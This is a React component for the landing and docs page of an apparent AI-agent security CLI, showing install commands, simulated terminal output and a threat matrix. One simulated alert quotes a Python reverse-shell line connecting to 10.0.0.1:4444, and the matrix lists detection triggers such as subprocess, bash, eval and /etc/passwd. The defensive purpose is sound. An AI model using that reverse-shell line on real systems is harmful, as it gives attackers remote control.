import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { Terminal, Copy, Check, ShieldAlert, Cpu, Download, Sparkles, ArrowUpRight, Play, Eye } from 'lucide-react';
import { sound } from '../../utils/sound';
import { SectionBeamHeader } from '../layout/SectionBeamHeader';
import { ScrambleText } from '../animations/ScrambleText';
import { SplitTextReveal } from '../animations/SplitTextReveal';
import { TiltCard } from '../animations/TiltCard';

export const CliAndDocsHub: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'install' | 'commands' | 'stream' | 'matrix'>('install');
  const [installOs, setInstallOs] = useState<'curl' | 'powershell' | 'clone'>('curl');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [selectedCmd, setSelectedCmd] = useState<number>(0);

  const copyToClipboard = (text: string, key: string) => {
    sound.playVerified();
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2500);
  };

  const installCommands = {
    curl: 'curl -fsSL https://raw.githubusercontent.com/devmishra2049/ai-agent-firewall/main/install.sh | bash',
    powershell: 'irm https://raw.githubusercontent.com/devmishra2049/ai-agent-firewall/main/install.ps1 | iex',
    clone: 'git clone https://github.com/devmishra2049/ai-agent-firewall.git ~/.agent-firewall && cd ~/.agent-firewall/cli && npm link',
  };

  const commandsList = [
    {
      cmd: 'agent-firewall watch [dir]',
      desc: 'Watches directory in real-time as an agent edits files, hunting for malicious patterns and reverse shells.',
      exampleOutput: `$ agent-firewall watch
⚡ [PREFLIGHT]  Zero-Trust Sandbox Perimeter Armed
🔒 [SIGNATURES] 39 Real-Time Zero-Latency Threat Rules Loaded
🛡️ [HARNESSES]  Claude Code // Cursor // Codex // Aider // Copilot
[STATUS] Active  |  [POLICY] ZERO-TRUST ENFORCING  |  [TARGET] /my-workspace
Watching agent file generation and tool calls...
↳ [ALLOW] agent wrote src/auth.ts (Risk Score: 0/100 // Clean) (10:14:02)
↳ [INTERCEPTED] Neutralized malicious write to src/network_helper.py -> Quarantined`,
    },
    {
      cmd: 'agent-firewall run <cmd...>',
      desc: 'Wraps and sandboxes an agent process (e.g., claude, cursor, or python agent.py) with preflight AST + WASI limits.',
      exampleOutput: `$ agent-firewall run "python3 agent.py"
[FIREWALL WRAPPER] Spawning sandboxed child process: python3 agent.py
[AST PREFLIGHT] Parsing Abstract Syntax Tree before execution...
[POLICY VERDICT] ALLOWED (Preset: DATA_ANALYSIS)
[WASMTIME HARNESS] Compiling to wasm32-wasip1...
[WASI CEILINGS] Memory: 32MB Cap | CPU Fuel: 1,000,000 units
[EXECUTION SUCCESS] Returned exit code 0 in 4.2ms. Fuel consumed: 14,208 units.`,
    },
    {
      cmd: 'agent-firewall scan <path>',
      desc: 'One-shot deep security scan of a repository, directory, or source file against all 39 capability rules.',
      exampleOutput: `$ agent-firewall scan ./src/
Scanning 48 source files against 39 heuristic threat rules...
[PASS] src/main.rs (Score: 0/100)
[PASS] src/utils.py (Score: 0/100)
[ALERT] src/backdoor.py:12 -> Process Execution (Critical, Risk: 100/100)
[RESULT] 1 critical risk detected. Zero-trust gate recommends REJECT.`,
    },
    {
      cmd: 'agent-firewall test "code"',
      desc: 'Quickly evaluates an inline prompt or code snippet against capability policy presets.',
      exampleOutput: `$ agent-firewall test "import socket; s = socket.socket()"
Analyzing snippet AST...
Threat: Unauthorized outbound raw socket instantiation.
Risk Score: 95/100 (HIGH)
Verdict: DENY under presets [DATA_ANALYSIS, STRICT_SANDBOX]`,
    },
    {
      cmd: 'agent-firewall init',
      desc: 'Generates a .firewallrc.json policy config file with customized capability presets in your workspace.',
      exampleOutput: `$ agent-firewall init
Created .firewallrc.json in current directory.
Preset: strict-sandbox
Max Memory: 32MB
Max CPU Fuel: 1000000
Preopened Dirs: [./data]`,
    },
    {
      cmd: 'agent-firewall status',
      desc: 'Displays active firewall policy posture, Wasmtime engine availability, and backend connection status.',
      exampleOutput: `$ agent-firewall status
AI AGENT FIREWALL v1.0.0
Wasmtime WASI Preview 2: AVAILABLE
Preflight Rule Engine: 39 Signatures ACTIVE
FastAPI Backend: CONNECTED (localhost:8000)
Corsair PR Webhook Bridge: ARMED (Port 3001)`,
    },
  ];

  const threatMatrix = [
    {
      capability: 'Process Execution',
      score: '100',
      severity: 'Critical',
      triggers: 'Command::new, exec, spawn, subprocess, shell, bash',
      action: 'Immediate SIGKILL (137)',
    },
    {
      capability: 'Dynamic Execution',
      score: '100',
      severity: 'Critical',
      triggers: 'eval, dynamic compilation, code injection strings',
      action: 'Preflight AST Halt',
    },
    {
      capability: 'Filesystem Write',
      score: '80',
      severity: 'High',
      triggers: 'File::create, remove_file, remove_dir, disk writes',
      action: 'Cap-std Directory Virtualization',
    },
    {
      capability: 'Filesystem Read',
      score: '60',
      severity: 'Medium',
      triggers: 'File::open, read_to_string, /etc/passwd, directory scan',
      action: 'Sandboxed Read Allowlist',
    },
    {
      capability: 'Network Access',
      score: '60',
      severity: 'Medium',
      triggers: 'TcpStream, UdpSocket, HTTP requests, raw sockets',
      action: 'Egress Block / DNS Intercept',
    },
    {
      capability: 'CPU Fuel Exhaustion',
      score: '100',
      severity: 'Critical',
      triggers: 'Infinite loops, recursive tool calls, DoS generation',
      action: '1M Fuel Hardware Meter Limit',
    },
  ];

  return (
    <section className="relative py-24 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto space-y-16 overflow-hidden">
      {/* 60fps Section Beam Header */}
      <SectionBeamHeader
        number="03"
        title="CLI THREAT HUNTER &amp; QUICKSTART MANUAL"
        subtitle="TERMINAL RUNTIME"
      />

      {/* Main Section Header */}
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
        <div className="space-y-4 max-w-2xl">
          <h2 className="text-3xl sm:text-5xl font-normal tracking-tight text-white uppercase">
            <SplitTextReveal type="words" delay={0.1}>
              TERMINAL INSPECTOR &amp;
            </SplitTextReveal> <br />
            <span className="text-[#d9ba84] font-medium tracking-tight">
              <SplitTextReveal type="words" delay={0.25}>
                agent threat hunter.
              </SplitTextReveal>
            </span>
          </h2>
          <p className="text-sm sm:text-base text-zinc-200 font-normal leading-relaxed text-crisp">
            Zero-latency local runtime that watches coding agents in real-time, hunts down malicious code before it executes, and enforces capability boundaries on host developer machines.
          </p>
        </div>

        {/* Action Button to Terminal Setup & Docs */}
        <Link
          to="/docs"
          onClick={() => sound.playClick()}
          className="inline-flex items-center gap-2 px-5 py-3 rounded-xl border border-[#d9ba84] bg-[#d9ba84]/15 hover:bg-[#d9ba84] text-[#d9ba84] hover:text-black font-mono text-xs font-bold uppercase tracking-wider transition-all duration-300 shadow-[0_0_20px_rgba(217,186,132,0.25)] cursor-pointer"
        >
          <span>Terminal Setup &amp; Docs</span>
          <ArrowUpRight className="size-3.5" />
        </Link>
      </div>

      {/* Modern Borderless Navigation Tabs (Boxless & Dot-Free) */}
      <div className="flex flex-wrap items-center gap-6 sm:gap-8 pb-2 border-b border-white/10 font-mono text-xs">
        <button
          onClick={() => { sound.playClick(); setActiveTab('install'); }}
          className={`pb-2 transition-all cursor-pointer flex items-center gap-2 ${
            activeTab === 'install'
              ? 'text-[#d9ba84] font-bold border-b-2 border-[#d9ba84]'
              : 'text-zinc-400 hover:text-white'
          }`}
        >
          <Download className="size-3.5" />
          <span>1-COMMAND INSTALL</span>
        </button>

        <button
          onClick={() => { sound.playClick(); setActiveTab('commands'); }}
          className={`pb-2 transition-all cursor-pointer flex items-center gap-2 ${
            activeTab === 'commands'
              ? 'text-[#d9ba84] font-bold border-b-2 border-[#d9ba84]'
              : 'text-zinc-400 hover:text-white'
          }`}
        >
          <Terminal className="size-3.5" />
          <span>CLI COMMAND MATRIX</span>
        </button>

        <button
          onClick={() => { sound.playClick(); setActiveTab('stream'); }}
          className={`pb-2 transition-all cursor-pointer flex items-center gap-2 ${
            activeTab === 'stream'
              ? 'text-[#d9ba84] font-bold border-b-2 border-[#d9ba84]'
              : 'text-zinc-400 hover:text-white'
          }`}
        >
          <Eye className="size-3.5" />
          <span>LIVE TERMINAL STREAM</span>
        </button>

        <button
          onClick={() => { sound.playClick(); setActiveTab('matrix'); }}
          className={`pb-2 transition-all cursor-pointer flex items-center gap-2 ${
            activeTab === 'matrix'
              ? 'text-[#d9ba84] font-bold border-b-2 border-[#d9ba84]'
              : 'text-zinc-400 hover:text-white'
          }`}
        >
          <ShieldAlert className="size-3.5" />
          <span>THREAT &amp; CAPABILITY MATRIX</span>
        </button>
      </div>

      {/* Tab 1: 1-Command Installation */}
      {activeTab === 'install' && (
        <div className="space-y-8">
          {/* OS Selector Pills */}
          <div className="flex items-center gap-3 font-mono text-xs">
            <button
              onClick={() => { sound.playClick(); setInstallOs('curl'); }}
              className={`px-4 py-2 rounded-xl transition cursor-pointer ${
                installOs === 'curl'
                  ? 'bg-[#d9ba84] text-black font-bold shadow-[0_0_15px_rgba(217,186,132,0.3)]'
                  : 'bg-white/5 border border-white/10 text-zinc-400 hover:text-white'
              }`}
            >
              macOS &amp; Linux (bash)
            </button>

            <button
              onClick={() => { sound.playClick(); setInstallOs('powershell'); }}
              className={`px-4 py-2 rounded-xl transition cursor-pointer ${
                installOs === 'powershell'
                  ? 'bg-[#d9ba84] text-black font-bold shadow-[0_0_15px_rgba(217,186,132,0.3)]'
                  : 'bg-white/5 border border-white/10 text-zinc-400 hover:text-white'
              }`}
            >
              Windows (PowerShell)
            </button>

            <button
              onClick={() => { sound.playClick(); setInstallOs('clone'); }}
              className={`px-4 py-2 rounded-xl transition cursor-pointer ${
                installOs === 'clone'
                  ? 'bg-[#d9ba84] text-black font-bold shadow-[0_0_15px_rgba(217,186,132,0.3)]'
                  : 'bg-white/5 border border-white/10 text-zinc-400 hover:text-white'
              }`}
            >
              Manual Git &amp; NPM Link
            </button>
          </div>

          {/* Code Box with 1-Click Copy */}
          <div className="fps-glass rounded-2xl p-6 sm:p-8 font-mono text-xs sm:text-sm relative overflow-hidden border border-white/15 shadow-2xl">
            <div className="flex items-center justify-between pb-4 border-b border-white/10 text-zinc-400 text-xs">
              <span className="font-semibold text-white">
                {installOs === 'curl' && 'bash // macOS & Linux Terminal'}
                {installOs === 'powershell' && 'pwsh // Windows PowerShell'}
                {installOs === 'clone' && 'sh // Git Clone & Global Symlink'}
              </span>
              <button
                onClick={() => copyToClipboard(installCommands[installOs], installOs)}
                className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-white/10 hover:bg-[#d9ba84] text-zinc-300 hover:text-black transition cursor-pointer font-bold text-xs"
              >
                {copiedKey === installOs ? (
                  <>
                    <Check className="size-3.5 text-emerald-400" />
                    <span>COPIED!</span>
                  </>
                ) : (
                  <>
                    <Copy className="size-3.5" />
                    <span>COPY COMMAND</span>
                  </>
                )}
              </button>
            </div>

            <div className="pt-6 font-mono text-white break-all leading-relaxed select-all">
              <span className="text-[#d9ba84] mr-2 font-bold">$</span>
              {installCommands[installOs]}
            </div>

            <div className="mt-8 pt-6 border-t border-white/10 grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs font-mono text-zinc-400">
              <div>
                <span className="text-zinc-500 block text-[10px] uppercase">Package Name</span>
                <span className="text-white font-semibold">agent-firewall</span>
              </div>
              <div>
                <span className="text-zinc-500 block text-[10px] uppercase">Signatures Loaded</span>
                <span className="text-[#d9ba84] font-semibold">39 Zero-Latency Rules</span>
              </div>
              <div>
                <span className="text-zinc-500 block text-[10px] uppercase">License</span>
                <span className="text-emerald-400 font-semibold">Apache 2.0 Open Source</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab 2: CLI Command Matrix */}
      {activeTab === 'commands' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          {/* Left: Command List */}
          <div className="lg:col-span-5 flex flex-col space-y-2 font-mono text-xs">
            {commandsList.map((item, idx) => {
              const isSelected = selectedCmd === idx;
              return (
                <button
                  key={idx}
                  onClick={() => { sound.playClick(); setSelectedCmd(idx); }}
                  className={`p-4 text-left rounded-xl transition cursor-pointer border ${
                    isSelected
                      ? 'border-[#d9ba84] bg-white/[0.05] text-white shadow-[0_0_15px_rgba(217,186,132,0.15)]'
                      : 'border-white/10 text-zinc-400 hover:text-zinc-200 hover:bg-white/[0.02]'
                  }`}
                >
                  <div className="text-sm font-bold text-[#d9ba84]">
                    $ {item.cmd}
                  </div>
                  <p className="text-xs text-zinc-400 mt-2 font-sans line-clamp-2">
                    {item.desc}
                  </p>
                </button>
              );
            })}
          </div>

          {/* Right: Terminal Output Preview */}
          <div className="lg:col-span-7">
            <TiltCard maxTilt={4} className="rounded-2xl">
              <div className="bg-black/90 border border-white/20 rounded-2xl p-6 font-mono text-xs shadow-2xl space-y-4">
                <div className="flex items-center justify-between pb-3 border-b border-white/10 text-zinc-400">
                  <span className="text-zinc-300 font-semibold">
                    SIMULATED TERMINAL OUTPUT
                  </span>
                  <button
                    onClick={() => copyToClipboard(commandsList[selectedCmd].cmd, `cmd-${selectedCmd}`)}
                    className="inline-flex items-center gap-1.5 text-zinc-400 hover:text-[#d9ba84] transition"
                  >
                    {copiedKey === `cmd-${selectedCmd}` ? (
                      <span className="text-emerald-400 font-bold">COPIED!</span>
                    ) : (
                      <>
                        <Copy className="size-3" />
                        <span>COPY SYNTAX</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="p-4 bg-[#08080a] border border-white/10 rounded-xl whitespace-pre-wrap leading-relaxed text-zinc-200 shadow-inner font-mono text-xs max-h-[380px] overflow-y-auto">
                  {commandsList[selectedCmd].exampleOutput}
                </div>

                <div className="pt-2 text-[10px] text-zinc-500 uppercase tracking-wider flex justify-between font-mono">
                  <span>FIREWALL KERNEL RUNTIME</span>
                  <span className="text-[#d9ba84] font-semibold">OPEN SOURCE CORE</span>
                </div>
              </div>
            </TiltCard>
          </div>
        </div>
      )}

      {/* Tab 3: Live Terminal Stream */}
      {activeTab === 'stream' && (
        <div className="fps-glass rounded-2xl p-6 sm:p-8 font-mono text-xs relative overflow-hidden border border-white/15 shadow-2xl space-y-4 bg-black/90">
          <div className="flex items-center justify-between pb-4 border-b border-white/10 text-zinc-400">
            <div className="flex items-center gap-3">
              <span className="text-white font-bold tracking-wider">
                LIVE AGENT THREAT HUNTER RUNTIME
              </span>
            </div>
            <span className="text-emerald-400 font-bold tracking-wider">[STREAMING ACTIVE]</span>
          </div>

          <div className="p-6 bg-[#050508] border border-white/10 rounded-xl space-y-4 font-mono text-xs leading-relaxed overflow-x-auto">
            <pre className="text-[#d9ba84] text-[10px] sm:text-xs font-bold leading-tight select-none">
{`   █████╗ ██╗   ███████╗██╗██████╗ ███████╗██╗    ██╗ █████╗ ██╗     ██╗     
  ██╔══██╗██║   ██╔════╝██║██╔══██╗██╔════╝██║    ██║██╔══██╗██║     ██║     
  ███████║██║   █████╗  ██║██████╔╝█████╗  ██║ █╗ ██║███████║██║     ██║     
  ██╔══██║██║   ██╔══╝  ██║██╔══██╗██╔══╝  ██║███╗██║██╔══██║██║     ██║     
  ██║  ██║██║   ██║     ██║██║  ██║███████╗╚███╔███╔╝██║  ██║███████╗███████╗`}
            </pre>

            <div className="text-zinc-400 pt-2 border-t border-white/5 space-y-1">
              <div>★ star: github.com/devmishra2049/ai-agent-firewall</div>
              <div>⚡ [PREFLIGHT]  Zero-Trust Sandbox Perimeter Armed</div>
              <div>🔒 [SIGNATURES] 39 Real-Time Zero-Latency Threat Rules Loaded</div>
              <div>🛡️ [HARNESSES]  Claude Code // Cursor // Codex // Aider // Copilot</div>
              <div className="text-zinc-500 pt-2">[STATUS] Active  |  [POLICY] ZERO-TRUST ENFORCING  |  [TARGET] /my-workspace</div>
              <div className="text-zinc-400">Watching agent file generation and tool calls...</div>
            </div>

            <div className="text-emerald-400 pt-2">
              ↳ [ALLOW] agent wrote src/auth.ts (Risk Score: 0/100 // Clean) (10:14:02)
            </div>

            <div className="p-4 bg-red-950/40 border border-red-500/60 rounded-lg space-y-2 text-red-200">
              <div className="font-bold text-red-300 text-sm">
                🚨 MALICIOUS AGENT CODE DETECTED: Interactive Reverse Shell (CRITICAL)
              </div>
              <div className="text-xs">Target: src/network_helper.py:14</div>
              <div className="text-xs">Attack Category: Reverse Shell</div>
              <div className="text-xs">Rule Triggered: Detected unauthorized outbound interactive reverse shell.</div>
              <div className="p-2.5 bg-black/70 border border-red-900/50 rounded font-mono text-zinc-200 text-xs mt-1">
                14 │ s = socket.socket(); s.connect(("10.0.0.1", 4444)); os.dup2(s.fileno(), 0)
              </div>
              <div className="font-bold text-red-400 pt-1">
                🛡️ Action Taken: Execution Blocked &amp; Quarantined to .firewall-quarantine/
              </div>
            </div>

            <div className="text-zinc-300 space-y-1 pt-1">
              <div>↳ [QUARANTINED] Neutralized malicious write to src/network_helper.py</div>
              <div className="text-amber-400">↳ [LOOP DETECTED] Agent loop detected on src/models.py (3 identical writes)</div>
            </div>
          </div>
        </div>
      )}

      {/* Tab 4: Threat & Capability Matrix */}
      {activeTab === 'matrix' && (
        <div className="space-y-8">
          <div className="overflow-x-auto fps-glass rounded-2xl border border-white/15 shadow-2xl">
            <table className="w-full text-left font-mono text-xs">
              <thead className="border-b border-white/10 bg-white/[0.04] text-zinc-400 uppercase text-[10px] tracking-wider">
                <tr>
                  <th className="py-4 px-6">Capability Category</th>
                  <th className="py-4 px-4 text-center">Risk Score</th>
                  <th className="py-4 px-4">Severity</th>
                  <th className="py-4 px-6">Blocked Triggers &amp; Patterns</th>
                  <th className="py-4 px-6">Firewall Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5 text-zinc-300">
                {threatMatrix.map((item, idx) => (
                  <tr key={idx} className="hover:bg-white/[0.02] transition">
                    <td className="py-4 px-6 font-bold text-white">
                      {item.capability}
                    </td>
                    <td className="py-4 px-4 text-center font-bold text-[#d9ba84]">
                      {item.score}
                    </td>
                    <td className="py-4 px-4">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                        item.severity === 'Critical'
                          ? 'bg-red-950/60 text-red-300 border border-red-800/60'
                          : item.severity === 'High'
                          ? 'bg-amber-950/60 text-amber-300 border border-amber-800/60'
                          : 'bg-zinc-800 text-zinc-300 border border-white/10'
                      }`}>
                        {item.severity}
                      </span>
                    </td>
                    <td className="py-4 px-6 text-zinc-400 font-mono text-xs">
                      {item.triggers}
                    </td>
                    <td className="py-4 px-6 font-medium text-emerald-400">
                      {item.action}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* Security Presets Summary */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 font-mono text-xs">
            <div className="p-5 fps-glass rounded-xl border border-white/10 space-y-2">
              <div className="text-[#d9ba84] font-bold uppercase tracking-wider">
                PRESET: DATA ANALYSIS (DEFAULT)
              </div>
              <p className="text-zinc-300 font-sans text-xs leading-relaxed">
                Permits reading data.csv only. Network is disabled. Hard ceiling of 32 MB RAM and 1,000,000 CPU fuel units.
              </p>
            </div>

            <div className="p-5 fps-glass rounded-xl border border-white/10 space-y-2">
              <div className="text-[#d9ba84] font-bold uppercase tracking-wider">
                PRESET: STRICT SANDBOX
              </div>
              <p className="text-zinc-300 font-sans text-xs leading-relaxed">
                Zero filesystem I/O permitted. Pure in-memory compute only. Instant AST rejection on any disk access.
              </p>
            </div>

            <div className="p-5 fps-glass rounded-xl border border-white/10 space-y-2">
              <div className="text-[#d9ba84] font-bold uppercase tracking-wider">
                PRESET: NETWORK ENABLED
              </div>
              <p className="text-zinc-300 font-sans text-xs leading-relaxed">
                Explicitly scoped for authorized outbound network endpoints only, stopping lateral reconnaissance scans.
              </p>
            </div>
          </div>
        </div>
      )}

    </section>
  );
};
